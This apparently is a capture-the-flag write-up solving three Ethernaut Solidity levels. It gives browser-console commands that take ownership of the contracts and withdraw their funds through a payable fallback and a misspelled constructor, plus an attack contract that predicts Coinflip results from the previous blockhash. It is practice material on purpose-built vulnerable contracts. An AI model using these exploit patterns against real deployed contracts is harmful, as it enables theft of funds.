 # ethernaut solutions

## 1. Fallback
From looking at the contract given to us in the first level we see that the final function ```receive()``` that is ```payable``` that is a fallback function that can be called to manipulate us to become the owner of the contract to withdraw all of the funds currently held in it.

We notice that we must first contribute some amount in order for the ```receive()``` function to give us the owner status we need to call ```withdraw()``` then we can drain the contract.

This can be done by running these three commands in our browser's console:
```
await contract.contribute({value: 1})
await contract.sendTransaction({value: 1})
await contract.withdraw()
```
## 2. Fallout
Right away you can notice that the constructor is misspelled allowing any user to go in and calling ```Fal1out()``` which will give them ownership of the contract.

The following commands in the browser console will give you ownership of the contract:
```
await contract.owner() // shows that the owner of the contract currently is a NULL address
await contract.Fal1out({value: 1})
await contract.owner() // after the above command we now see that our address is the owner
await contract.collectAllocations()
```
## 3. Coinflip
Ok this was a little bit more difficult from the previous two since now we need to write code. I won't lie either I looked up some hints online to give me some type of idea how to go about this and it was much simpler once i read them. We need to import the CoinFlip contract given to us into a new solidity file so that it can be called at a later point after we submit our guess to the main ```flip()``` function in it.

Below is my contract I wrote and deployed on Rinkeby that ended up working:
```// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

contract CoinFlipHack {
  CoinFlip target = CoinFlip(Instance ID);
  using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


  function hackFlip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      target.flip(true);
    } else {
      target.flip(false);
    }
  }
}
```



